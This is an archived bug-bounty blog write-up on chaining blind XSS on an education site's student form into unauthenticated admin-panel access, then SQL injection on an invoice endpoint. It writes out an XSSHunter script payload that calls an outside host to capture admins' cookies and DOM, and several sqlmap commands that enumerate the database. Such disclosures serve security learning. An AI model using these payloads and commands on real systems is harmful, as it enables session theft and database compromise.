---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-13_blind-xss-and-time-based-sql-injection-to-admin-panel-control-and-database-takeo.md
original_filename: 2022-09-13_blind-xss-and-time-based-sql-injection-to-admin-panel-control-and-database-takeo.md
title: Blind XSS and Time-Based SQL Injection to Admin Panel Control and Database
  Takeover
category: documents
detected_topics:
- xss
- api-security
- sqli
- command-injection
- file-upload
- automation-abuse
tags:
- imported
- documents
- xss
- api-security
- sqli
- command-injection
- file-upload
- automation-abuse
language: en
raw_sha256: 025e895a3fa52dbb550d97bf69e909ad7359200b4a3b5a7955d54c235e9e4e57
text_sha256: a069390af56fca89b3bf0c6c4cca67fdcae5dffe36c928aafd61e8b5f753f771
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Blind XSS and Time-Based SQL Injection to Admin Panel Control and Database Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-13_blind-xss-and-time-based-sql-injection-to-admin-panel-control-and-database-takeo.md
- Source Type: markdown
- Detected Topics: xss, api-security, sqli, command-injection, file-upload, automation-abuse
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `025e895a3fa52dbb550d97bf69e909ad7359200b4a3b5a7955d54c235e9e4e57`
- Text SHA256: `a069390af56fca89b3bf0c6c4cca67fdcae5dffe36c928aafd61e8b5f753f771`


## Content

---
title: "Blind XSS and Time-Based SQL Injection to Admin Panel Control and Database Takeover"
url: "https://medium.com/@cyberali/blind-xss-and-time-based-sql-injection-to-admin-panel-control-and-database-takeover-9b7645a53748"
authors: ["Cyberali"]
bugs: ["Blind XSS", "SQL injection"]
publication_date: "2022-09-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2173
scraped_via: "browseros"
---

# Blind XSS and Time-Based SQL Injection to Admin Panel Control and Database Takeover

Blind XSS and Time-Based SQL Injection to Admin Panel Control and Database Takeover
Cyberali
Follow
5 min read
·
Sep 13, 2022

120

2

Hello Fellas,

Aim of every attacker is to gain full access to the admin panel or deep dive into the database. What if I give you a flavor of both in one article.

It was a rainy day. I was sitting in my office. I opened my Gmail inbox. Wows Wait What? There was a notification from XSSHunter.

Cross site scripting has been a problem for more than a decade and it’s one of my favorite vulnerabilities.

What is XSS or Cross Site Scripting Attack?

It is a Client Side Attack in which the attacker searches for the weak endpoint in the target website and injects the malicious JavaScript code in the client’s browser. Weak endpoints include input fields, URL parameters, image or file upload, user-agent, referrer header, feedback and contact us forms etc.

What can an Attacker do?

Attackers can execute scripts in a victim’s browser to hijack user sessions, deface websites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.

Types of XSS:

Reflected XSS:- Non persistent and Injected Code is reflected on the application code. The code executes if the endpoints are not filtered or sanitized properly.
DOM Based XSS: — It occurs by altering the DOM in the victim’s browser. It allows the user to run the code without the user’s knowledge.
Stored XSS: — Injected Code becomes a persistent part of the web application. The malicious code gets stored in the web sites database and is executed every time when the page is visited where the payload is stored.

Note: I will not reveal the name of the website. I will call it redicated.com where necessary.

Description:

There was a functionality in the website, where the students fill the form and the application gets submitted to become a part of the class group. After successful submission the detail becomes visible on the teacher’s account and he/ she must approve the student’s form. The same content is visible on the admin panel or super admin. In this form there were 4 input fields i.e. Email, Name, Institute, Group ID. After injecting the payload. Whenever the admin views the information of students I receive a notification in my Gmail.

Steps to Reproduce:

I filled the necessary fields, but concatenated my xsshunter payload with my email address i.e. xyz@gmail.com “><script src=https://link.xss.ht></script>

The payload got saved in the database. Here, whenever the teacher will view my information to approve or reject, the payload will execute and the attacker(me) will receive the notification in his/ her inbox.

Press enter or click to view image in full size

After the successful triggering of payload the attacker will get below things in his xsshunter account. i.e.

IP Address of Victim

2. DOM

3. Cookie

4. Screenshot where it is executed

I received an email in my inbox. Now I was reporting this vulnerability as “Blind XSS”, but the DOM I received made me curious. Here I was thinking what the admin panel would be like. An idea triggered in my mind:-

I created a file with an HTML extension.

Copied the DOM I received in my xsshunter account.

Get Cyberali’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Pasted in the file and opened in my browser.

Here I was able to see a dummy admin panel with static pages.

Here there was a navigation bar at the top. I hovered it and clicked on megadmin.

I was redirected to the admin panel where I was able to perform CRUD operations on all the active users. I searched my record and BOOOOOOOOOOOOM got it man….

One by One I tested all the navigations and there was no authentication on the URLS. I was able to steal the invoices, Generate API keys, PayPal information, delete the Documents, view/edit the time table, record the employees completely and Many more.

Press enter or click to view image in full size

I didn’t reported that vulnerability. I was looking for something new because I was not still satisfied from this vulnerability. I was looking for same vulnerabilities which we find on the normal available interface in the admin end. So one by one I started crawling the admin interfaces. I found more interesting vulnerabilities like reflected XSS and SQL Injection. Description of SQL injection is given below:

What is SQL Injection?

SQL injection in simple words is a vulnerability in which the attacker interferes or communicates with the database. The attacker can retrieve all the data from DB without any restriction. This is because the user input is directly hitting the database query.

After reporting the above vulnerability my curiosity made me think that it’s not enough. After crawling some URLs I found an interesting endpoint shown below:

https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=<<32 bits key>>

I inserted (‘) at the end of id_user value. BOOOOOM I got an error from MySQL DB. It’s time to take out SQLMap.

First of all I used SQLMap to verify the detected SQL Injection using the below command

sqlmap -u “https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=<<32 bits key>>” -p id_user — level=5

Press enter or click to view image in full size

After seeing that the parameter is vulnerable i retrieved the databases using below command:

sqlmap -u “https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=<<32 bits key>>” -p id_user — level=5 — dbs

To get the tables of database XYZ_cms

sqlmap -u “https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=<<32 bits key>>” -p id_user — level=5 — tables -D <<database name>>

Below is the command i used to fetch the columns:

sqlmap -u “https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=<<32 bits key>>” -p id_user — level=5 — columns -D <<database name>> -T <<table name>>

The next day I received the below mail($$$$) . It was a great motivation. I will keep sharing my experience and techniques with my fellas. Keep supporting and motivating me. Thank you

Press enter or click to view image in full size

At the end, I would like to say that spend as much time on your target as you can. Try to exploit inject the XSSHunter payload in every possible field as possible, it might be possible that the payload may execute on the server admin side.

Just Chill….Don’t forget the coffee cup…

Thank you!
